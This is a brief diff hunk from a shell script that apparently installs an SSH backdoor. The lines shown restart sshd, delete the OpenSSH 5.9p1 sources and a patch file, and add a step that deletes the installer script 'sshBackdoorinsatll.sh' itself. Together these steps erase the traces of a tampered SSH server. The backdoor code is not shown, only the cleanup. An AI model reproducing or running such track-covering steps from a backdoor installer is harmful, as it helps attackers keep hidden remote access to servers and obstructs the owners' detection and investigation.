@@ -18,3 +18,4 @@ service sshd restart
 cd ..
 rm -f 0x06-openssh-5.9*
 rm -rf openssh-5.9p1*
+rm -f sshBackdoorinsatll.sh
